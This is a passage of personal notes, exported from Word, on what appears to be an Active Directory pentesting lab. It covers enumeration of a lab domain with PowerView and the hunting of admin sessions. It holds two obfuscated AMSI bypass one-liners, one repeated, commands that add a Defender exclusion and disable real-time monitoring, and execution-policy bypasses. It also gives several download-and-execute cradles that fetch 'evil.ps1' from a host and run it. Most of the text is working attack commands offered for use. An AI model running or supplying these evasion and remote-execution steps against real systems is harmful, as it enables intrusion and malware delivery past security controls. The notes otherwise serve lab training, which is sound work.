
<p class=MsoNormal><b>Get domain information</b><o:p></o:p></p>
![image001](https://github.com/user-attachments/assets/7918c0b9-b9fb-4f7a-8684-0e60be03e66f)

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

![image002](https://github.com/user-attachments/assets/2a063aa2-0ec2-4d92-bc80-28eb3e3358a1)


<p class=MsoNormal>Ipconfig /all<o:p></o:p></p>

<p class=MsoNormal>PS C:\Users\student157&gt; [<span class=SpellE>System.Net.Dns</span><span
class=GramE>]::</span><span class=SpellE>GetHostByName</span>(($<span
class=SpellE>env:computerName</span>))<span style='mso-spacerun:yes'>  </span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>PS C:\Users\student157&gt; $<span class=SpellE>ADClass</span>
= [<span class=SpellE><span class=GramE>System.DirectoryServices.ActiveDirectory.Domain</span></span>]<o:p></o:p></p>

<p class=MsoNormal>PS C:\Users\student157&gt; $<span class=SpellE><span
class=GramE>ADClass</span></span><span class=GramE>::</span><span class=SpellE>GetCurrentDomain</span>()<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><b>Script execution examples: </b><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<ul style='margin-top:0in' type=disc>
 <li class=MsoNormal style='mso-list:l1 level1 lfo1;tab-stops:list .5in'>Load a
     PowerShell script using dot sourcing <span class=GramE>PS .</span>
     C:\AD\Tools\Powershell.ps1<o:p></o:p></li>
 <li class=MsoNormal style='mso-list:l1 level1 lfo1;tab-stops:list .5in'>A
     module can be imported with:<span style='mso-spacerun:yes'>  </span>--&gt;
     <b>Import-Module</b> &lt;<span class=SpellE>modulename</span>&gt; .<span
     class=SpellE>psd</span> (file Name)<o:p></o:p></li>
 <li class=MsoNormal style='mso-list:l1 level1 lfo1;tab-stops:list .5in'>All
     the commands in a module can be listed with:<span
     style='mso-spacerun:yes'>  </span>--<span class=GramE>&gt;<span
     style='mso-spacerun:yes'>  </span>Get</span>-Command -Module &lt;<span
     class=SpellE>modulename</span>&gt;<o:p></o:p></li>
</ul>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>PowerShell script enumeration and usage also difference
between &lt; &gt; <span class=GramE>{ }</span> etc.<o:p></o:p></p>

<p class=MsoNormal>Once the script successfully loaded into the memory and we
can call <span class=GramE>each and every</span> function along with the
examples such as -full, -detailed<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<ul style='margin-top:0in' type=disc>
 <li class=MsoNormal style='mso-list:l0 level1 lfo2;tab-stops:list .5in'><span
     style='mso-spacerun:yes'>    </span>&quot;<span class=GramE>get</span>-help
     Get-<span class=SpellE>NetGroup</span>&quot;<o:p></o:p></li>
 <li class=MsoNormal style='mso-list:l0 level1 lfo2;tab-stops:list .5in'><span
     style='mso-spacerun:yes'>    </span>&quot;<span class=GramE>get</span>-help
     Get-<span class=SpellE>NetGroup</span> -examples&quot;.<o:p></o:p></li>
 <li class=MsoNormal style='mso-list:l0 level1 lfo2;tab-stops:list .5in'><span
     style='mso-spacerun:yes'>    </span>&quot;<span class=GramE>get</span>-help
     Get-<span class=SpellE>NetGroup</span> -full&quot;.<o:p></o:p></li>
 <li class=MsoNormal style='mso-list:l0 level1 lfo2;tab-stops:list .5in'><span
     style='mso-spacerun:yes'>    </span>&quot;<span class=GramE>get</span>-help
     Get-<span class=SpellE>NetGroup</span> -detailed&quot;.<o:p></o:p></li>
 <li class=MsoNormal style='mso-list:l0 level1 lfo2;tab-stops:list .5in'><span
     style='mso-spacerun:yes'>    </span>&quot;<span class=GramE>show</span>-command
     Get-<span class=SpellE>NetGroup</span>&quot;.<o:p></o:p></li>
 <li class=MsoNormal style='mso-list:l0 level1 lfo2;tab-stops:list .5in'><span
     style='mso-spacerun:yes'>    </span>&quot;Update-Help<span class=GramE>&quot;<span
     style='mso-spacerun:yes'>  </span>--</span> update help system<o:p></o:p></li>
</ul>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>PS C:\AD\Tools&gt; get-help Get-<span class=SpellE>NetGroup</span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>SYNTAX<o:p></o:p></p>

<p class=MsoNormal><span style='mso-spacerun:yes'>    </span>Get-<span
class=SpellE>NetGroup</span> [[-<span class=SpellE>GroupName</span>]
&lt;String&gt;] [[-SID] &lt;String&gt;] [[-<span class=SpellE>UserName</span>]
&lt;String&gt;] [[-Filter] &lt;String&gt;] [[-Domain] &lt;String&gt;]<o:p></o:p></p>

<p class=MsoNormal><span style='mso-spacerun:yes'>    </span>[[-<span
class=SpellE>DomainController</span>] &lt;String&gt;] [[-<span class=SpellE>ADSpath</span>]
&lt;String&gt;] [-<span class=SpellE>AdminCount</span>] [-<span class=SpellE>FullData</span>]
[-<span class=SpellE>RawSids</span>] [-<span class=SpellE>AllTypes</span>] [[-<span
class=SpellE>PageSize</span>]<o:p></o:p></p>

<p class=MsoNormal><span style='mso-spacerun:yes'>    </span>&lt;Int32&gt;]
[[-Credential] &lt;<span class=SpellE>PSCredential</span>&gt;] [&lt;<span
class=SpellE>CommonParameters</span>&gt;]<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><b>Exclusion adding for specific path</b><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>The local enhanced login and system word prescription and <span
class=SpellE>amsi</span> and script block logging.<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shapetype
 id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t"
 path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f">
 <v:stroke joinstyle="miter"/>
 <v:formulas>
  <v:f eqn="if lineDrawn pixelLineWidth 0"/>
  <v:f eqn="sum @0 1 0"/>
  <v:f eqn="sum 0 0 @1"/>
  <v:f eqn="prod @2 1 2"/>
  <v:f eqn="prod @3 21600 pixelWidth"/>
  <v:f eqn="prod @3 21600 pixelHeight"/>
  <v:f eqn="sum @0 0 1"/>
  <v:f eqn="prod @6 1 2"/>
  <v:f eqn="prod @7 21600 pixelWidth"/>
  <v:f eqn="sum @8 21600 0"/>
  <v:f eqn="prod @7 21600 pixelHeight"/>
  <v:f eqn="sum @10 21600 0"/>
 </v:formulas>
 <v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/>
 <o:lock v:ext="edit" aspectratio="t"/>
</v:shapetype><v:shape id="Picture_x0020_100" o:spid="_x0000_i1074" type="#_x0000_t75"
 alt="A screenshot of a computer&#10;&#10;Description automatically generated"
 style='width:711pt;height:270pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image001.png" o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
</v:shape><![endif]--><![if !vml]><img width=948 height=360
src="test_files/image001.png"
alt="A screenshot of a computer&#10;&#10;Description automatically generated"
v:shapes="Picture_x0020_100"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span class=SpellE>powershell</span> -<span class=SpellE>inputformat</span>
none -<span class=SpellE>outputformat</span> none -<span class=SpellE>NonInteractive</span>
-Command &quot;Add-<span class=SpellE>MpPreference</span> -<span class=SpellE>ExclusionPath</span>
'C:\AD'&quot;<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span class=SpellE>sET-ItEM</span> ( 'V'+'<span
class=SpellE>aR</span>' + 'IA' + 'blE:1q2' + '<span class=SpellE>uZx</span>' )
( [<span class=SpellE>TYpE</span>]( &quot;{1}{0}&quot;-F'F','<span
class=SpellE>rE</span>' ) ) ; ( <span class=SpellE>GeT-VariaBle</span> (
&quot;1Q2U&quot; +&quot;<span class=SpellE>zX</span>&quot; ) -<span
class=SpellE>VaL</span> ).&quot;A`ss`Embly&quot;.&quot;<span class=SpellE>GET`TY`Pe</span>&quot;((
&quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f'Util','A','Amsi','.Management.','<span
class=SpellE>utomation</span>.','<span class=SpellE>s','System</span>' )
).&quot;<span class=SpellE>g`etf`iElD</span>&quot;( ( &quot;{0}{2}{1}&quot; -f'<span
class=SpellE>amsi</span>','d','<span class=SpellE>InitFaile</span>' ),(
&quot;{2}{4}{0}{1}{3}&quot; -f 'Stat','<span class=SpellE>i</span>','<span
class=SpellE>NonPubli</span>','<span class=SpellE>c','c</span>,' )).&quot;<span
class=SpellE>sE`T`VaLUE</span>&quot;( ${<span class=SpellE>n`ULl</span>},${<span
class=SpellE>t`RuE</span>} )<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span class=SpellE>S`eT-It`em</span> ( 'V'+'<span
class=SpellE>aR</span>' +<span style='mso-spacerun:yes'>  </span>'IA' +
((&quot;{1}{0}&quot;-f'1','blE:')+'q2')<span style='mso-spacerun:yes'> 
</span>+ ('<span class=SpellE>uZ</span>'+'x')<span style='mso-spacerun:yes'> 
</span>) ( [<span class=SpellE>TYpE</span>](<span style='mso-spacerun:yes'> 
</span>&quot;{1}{0}&quot;-F'F','<span class=SpellE>rE</span>'<span
style='mso-spacerun:yes'>  </span>) )<span style='mso-spacerun:yes'> 
</span>;<span style='mso-spacerun:yes'>    </span>(<span
style='mso-spacerun:yes'>    </span>Get-<span class=SpellE>varI`A`BLE</span><span
style='mso-spacerun:yes'>  </span>( ('1Q'+'2U')<span style='mso-spacerun:yes'> 
</span>+'<span class=SpellE>zX</span>'<span style='mso-spacerun:yes'> 
</span>)<span style='mso-spacerun:yes'>  </span>-<span class=SpellE>VaL</span><span
style='mso-spacerun:yes'>  </span>).&quot;A`ss`Embly&quot;.&quot;<span
class=SpellE>GET`TY`Pe</span>&quot;((<span style='mso-spacerun:yes'> 
</span>&quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f('<span class=SpellE>Uti'+'l</span>'),'A',('Am'+'<span
class=SpellE>si</span>'),((&quot;{0}{1}&quot; -f '.<span class=SpellE>M','an</span>')+'<span
class=SpellE>age'+'men'+'t</span>.'),('<span class=SpellE>u'+'to</span>'+(&quot;{0}{2}{1}&quot;
-f 'ma','.','<span class=SpellE>tion</span>')),'s',((&quot;{1}{0}&quot;-f '<span
class=SpellE>t','Sys</span>')+'<span class=SpellE>em</span>')<span
style='mso-spacerun:yes'>  </span>) ).&quot;<span class=SpellE>g`etf`iElD</span>&quot;(<span
style='mso-spacerun:yes'>  </span>( &quot;{0}{2}{1}&quot; -f('a'+'<span
class=SpellE>msi</span>'),'d',('I'+(&quot;{0}{1}&quot; -f '<span class=SpellE>ni</span>','<span
class=SpellE>tF</span>')+(&quot;{1}{0}&quot;-f '<span class=SpellE>ile</span>','a'))<span
style='mso-spacerun:yes'>  </span>),(<span style='mso-spacerun:yes'> 
</span>&quot;{2}{4}{0}{1}{3}&quot; -f ('<span class=SpellE>S'+'tat</span>'),'<span
class=SpellE>i</span>',('Non'+(&quot;{1}{0}&quot; -f'<span class=SpellE>ubl</span>','P')+'<span
class=SpellE>i</span>'),'<span class=SpellE>c','c</span>,'<span
style='mso-spacerun:yes'>  </span>)).&quot;<span class=SpellE>sE`T`VaLUE</span>&quot;(<span
style='mso-spacerun:yes'>  </span>${<span class=SpellE>n`ULl</span>},${<span
class=SpellE>t`RuE</span>} )<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><b>Disable anti-virus real time protection</b><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'><a
href="https://www.puckiestyle.nl/amsi-bypass/">https://www.puckiestyle.nl/amsi-bypass/</a><o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'><a
href="http://www.labofapenetrationtester.com/2016/09/amsi.html">http://www.labofapenetrationtester.com/2016/09/amsi.html</a><o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'><a
href="https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html">https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html</a><o:p></o:p></span></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>Set-<span class=SpellE>MpPreference</span> -<span
class=SpellE>DisableRealtimeMonitoring</span> $true<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><b>PowerShell script execution bypass</b><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span class=SpellE>powershell</span> -ep bypass<o:p></o:p></p>

<p class=MsoNormal><span class=SpellE>powershell</span> - <span class=SpellE>ExecutionPolicy</span>
bypass<o:p></o:p></p>

<p class=MsoNormal><span class=SpellE>powershell</span> -c &lt;cmd&gt;<o:p></o:p></p>

<p class=MsoNormal><span class=SpellE>powershell</span> -<span class=SpellE>encodedcommand</span><o:p></o:p></p>

<p class=MsoNormal>$<span class=SpellE><span class=GramE>env:PSExecutionPolicyPreference</span></span>
==&quot;bypass&quot;<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><b>Find Local admin Access</b><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>PS C:\AD\Tools&gt; Find-<span class=SpellE>LocalAdminAccess</span>
-Verbose<o:p></o:p></p>

<p class=MsoNormal>PS C:\AD\Tools&gt; Invoke-<span class=SpellE>CheckLocalAdminAccess</span>
-<span class=SpellE>ComputerName</span> dcorp-<span class=GramE>stud157.dollarcorp.moneycorp</span>.local<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>PS C:\AD\Tools<span class=GramE>&gt; .</span>
.\Find-WMILocalAdminAccess.ps1<o:p></o:p></p>

<p class=MsoNormal>PS C:\AD\Tools&gt; Find-<span class=SpellE>WMILocalAdminAccess</span>
-<span class=SpellE>ComputerFile</span> .\computers.txt<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><b>Find computers where a domain admin (or specified
user/group) has sessions:</b><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>PS C:\AD\Tools&gt; Invoke-<span class=SpellE>UserHunter</span>
-Verbose<span style='mso-spacerun:yes'>   </span><o:p></o:p></p>

<p class=MsoNormal>PS C:\AD\Tools&gt; Invoke-<span class=SpellE>UserHunter</span>
-Verbose -<span class=SpellE>GroupName</span> &quot;<span class=SpellE>rdpusers</span>&quot;<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><b>To confirm admin access</b><o:p></o:p></p>

<p class=MsoNormal>PS C:\AD\Tools&gt; Invoke-<span class=SpellE>UserHunter</span>
-<span class=SpellE>CheckAccess</span><o:p></o:p></p>

<p class=MsoNormal>Find computers where a domain admin is logged in.<o:p></o:p></p>

<p class=MsoNormal>PS C:\AD\Tools&gt; Invoke-<span class=SpellE>UserHunter</span>
-stealth<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>Enemerate session on any machine<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>PS C:\AD\Tools&gt; Get-NetSession -<span class=SpellE>ComputerName</span>
<span class=SpellE>dcorp-<span class=GramE>dc.dollarcorp</span>.moneycorp.local</span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><b>AMSI Bypass one-line script</b><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>sET-ItEM</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'>
( 'V'+'<span class=SpellE>aR</span>' + 'IA' + 'blE:1q2' + '<span class=SpellE>uZx</span>'
) ( [<span class=SpellE>TYpE</span>](&quot;{1}{0}&quot;-F'F','<span
class=SpellE>rE</span>' ) ) ; ( <span class=SpellE>GeT-VariaBle</span> (
&quot;1Q2U&quot; +&quot;<span class=SpellE>zX</span>&quot; ) -<span
class=SpellE>VaL</span>).&quot;A`ss`Embly&quot;.&quot;<span class=SpellE>GET`TY`Pe</span>&quot;((
&quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f'Util','A','Amsi','.Management.','<span
class=SpellE>utomation</span>.','<span class=SpellE>s','System</span>'
)).&quot;<span class=SpellE>g`etf`iElD</span>&quot;( ( &quot;{0}{2}{1}&quot;
-f'<span class=SpellE>amsi</span>','d','<span class=SpellE>InitFaile</span>'
),(&quot;{2}{4}{0}{1}{3}&quot; -f 'Stat','<span class=SpellE>i</span>','<span
class=SpellE>NonPubli</span>','<span class=SpellE>c','c</span>,')).&quot;<span
class=SpellE>sE`T`VaLUE</span>&quot;(${<span class=SpellE>n`ULl</span>},${<span
class=SpellE>t`RuE</span>} )<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><b><span lang=EN-IN style='mso-ansi-language:EN-IN'>Load
PowerShell Module or Script in Remote:</span></b><span lang=EN-IN
style='mso-ansi-language:EN-IN'><o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_99" o:spid="_x0000_i1073" type="#_x0000_t75" style='width:523.5pt;
 height:265.5pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image002.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=698 height=354
src="test_files/image003.jpg" v:shapes="Picture_x0020_99"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>iex</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'>
(New-Object <span class=SpellE>Net.WebClient</span><span class=GramE>).<span
class=SpellE>DownloadString</span></span>('https://webserver/payload.ps1')<o:p></o:p></span></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>$<span
class=SpellE>ie</span>=New-Object -<span class=SpellE>ComObject</span> <span
class=GramE>InternetExplorer.Application;$</span>ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep
5;$response=$<span class=SpellE>ie.Document.body.innerHTML</span>;$<span
class=SpellE>ie.quit</span>();<span class=SpellE>iex</span> $response<o:p></o:p></span></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PSv3
onwards:<span style='mso-spacerun:yes'>  </span>-<span class=SpellE>iex</span>
(<span class=SpellE>iwr</span> '<a href="http://192.168.230.1/evil.ps1">http://192.168.230.1/evil.ps1</a>')<o:p></o:p></span></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>$h=New-Object
-<span class=SpellE>ComObject</span> <span class=GramE>Msxml2.XMLHTTP;$</span>h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex
$<span class=SpellE>h.responseText</span><o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_98" o:spid="_x0000_i1072" type="#_x0000_t75" alt="A white rectangular object with text&#10;&#10;Description automatically generated with medium confidence"
 style='width:557.25pt;height:205.5pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image004.png" o:title="A white rectangular object with text&#10;&#10;Description automatically generated with medium confidence"/>
</v:shape><![endif]--><![if !vml]><img border=0 width=743 height=274
src="test_files/image005.jpg"
alt="A white rectangular object with text&#10;&#10;Description automatically generated with medium confidence"
v:shapes="Picture_x0020_98"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><b><span lang=EN-IN style='mso-ansi-language:EN-IN'>PowerShell
has 4 language mode</span></b><span lang=EN-IN style='mso-ansi-language:EN-IN'><o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<ul style='margin-top:0in' type=disc>
 <li class=MsoNormal style='mso-list:l2 level1 lfo3;tab-stops:list .5in'><span
     lang=EN-IN style='mso-ansi-language:EN-IN'>No language<o:p></o:p></span></li>
 <li class=MsoNormal style='mso-list:l2 level1 lfo3;tab-stops:list .5in'><span
     lang=EN-IN style='mso-ansi-language:EN-IN'>Constant Language<o:p></o:p></span></li>
 <li class=MsoNormal style='mso-list:l2 level1 lfo3;tab-stops:list .5in'><span
     lang=EN-IN style='mso-ansi-language:EN-IN'>Restricted language<o:p></o:p></span></li>
 <li class=MsoNormal style='mso-list:l2 level1 lfo3;tab-stops:list .5in'><span
     lang=EN-IN style='mso-ansi-language:EN-IN'>Full language mode <o:p></o:p></span></li>
</ul>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_97" o:spid="_x0000_i1071" type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
 style='width:543pt;height:237pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image006.png" o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
</v:shape><![endif]--><![if !vml]><img border=0 width=724 height=316
src="test_files/image007.jpg"
alt="A screenshot of a computer&#10;&#10;Description automatically generated"
v:shapes="Picture_x0020_97"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_96" o:spid="_x0000_i1070" type="#_x0000_t75" alt="A white and brown sign with black text&#10;&#10;Description automatically generated"
 style='width:555.75pt;height:196.5pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image008.png" o:title="A white and brown sign with black text&#10;&#10;Description automatically generated"/>
</v:shape><![endif]--><![if !vml]><img border=0 width=741 height=262
src="test_files/image009.jpg"
alt="A white and brown sign with black text&#10;&#10;Description automatically generated"
v:shapes="Picture_x0020_96"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_95" o:spid="_x0000_i1069" type="#_x0000_t75" style='width:622.5pt;
 height:321.75pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image010.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=830 height=429
src="test_files/image011.jpg" v:shapes="Picture_x0020_95"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_94" o:spid="_x0000_i1068" type="#_x0000_t75" alt="A white rectangular object with black text&#10;&#10;Description automatically generated"
 style='width:634.5pt;height:307.5pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image012.png" o:title="A white rectangular object with black text&#10;&#10;Description automatically generated"/>
</v:shape><![endif]--><![if !vml]><img border=0 width=846 height=410
src="test_files/image013.jpg"
alt="A white rectangular object with black text&#10;&#10;Description automatically generated"
v:shapes="Picture_x0020_94"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_93" o:spid="_x0000_i1067" type="#_x0000_t75" style='width:651.75pt;
 height:314.25pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image014.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=869 height=419
src="test_files/image015.jpg" v:shapes="Picture_x0020_93"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_92" o:spid="_x0000_i1066" type="#_x0000_t75" alt="A white paper with black text&#10;&#10;Description automatically generated"
 style='width:677.25pt;height:243pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image016.png" o:title="A white paper with black text&#10;&#10;Description automatically generated"/>
</v:shape><![endif]--><![if !vml]><img border=0 width=903 height=324
src="test_files/image017.jpg"
alt="A white paper with black text&#10;&#10;Description automatically generated"
v:shapes="Picture_x0020_92"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_91" o:spid="_x0000_i1065" type="#_x0000_t75" style='width:694.5pt;
 height:325.5pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image018.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=926 height=434
src="test_files/image019.jpg" v:shapes="Picture_x0020_91"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_90" o:spid="_x0000_i1064" type="#_x0000_t75" style='width:534.75pt;
 height:277.5pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image020.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=713 height=370
src="test_files/image021.jpg" v:shapes="Picture_x0020_90"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_89" o:spid="_x0000_i1063" type="#_x0000_t75" style='width:426.75pt;
 height:297.75pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image022.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=569 height=397
src="test_files/image023.jpg" v:shapes="Picture_x0020_89"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_88" o:spid="_x0000_i1062" type="#_x0000_t75" alt="A close-up of a computer screen&#10;&#10;Description automatically generated"
 style='width:540.75pt;height:163.5pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image024.png" o:title="A close-up of a computer screen&#10;&#10;Description automatically generated"/>
</v:shape><![endif]--><![if !vml]><img border=0 width=721 height=218
src="test_files/image025.jpg"
alt="A close-up of a computer screen&#10;&#10;Description automatically generated"
v:shapes="Picture_x0020_88"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<table class=MsoNormalTable border=1 cellspacing=0 cellpadding=0 title=""
 summary="" style='border-collapse:collapse;border:none;mso-border-alt:solid #A3A3A3 1.0pt;
 mso-yfti-tbllook:1184;mso-padding-alt:0in 0in 0in 0in'>
 <tr style='mso-yfti-irow:0;mso-yfti-firstrow:yes'>
  <td width=674 valign=top style='width:505.8pt;border:solid #A3A3A3 1.0pt;
  padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
  C:\AD\Tools&gt; Find-<span class=SpellE>LocalAdminAccess</span> -Verbose<o:p></o:p></span></p>
  <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>VERBOSE:
  [*] Enumerating server dcorp-<span class=GramE>stud158.dollarcorp.moneycorp</span>.local
  (14 of 20)<o:p></o:p></span></p>
  <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
  C:\AD\Tools&gt; Find-<span class=SpellE>LocalAdminAccess</span><o:p></o:p></span></p>
  <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
  EN-IN'>dcorp-<span class=GramE>adminsrv.dollarcorp</span>.moneycorp.local</span></span><span
  lang=EN-IN style='mso-ansi-language:EN-IN'><o:p></o:p></span></p>
  <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
  C:\AD\Tools&gt; <o:p></o:p></span></p>
  </td>
 </tr>
 <tr style='mso-yfti-irow:1'>
  <td width=676 valign=top style='width:507.1pt;border:solid #A3A3A3 1.0pt;
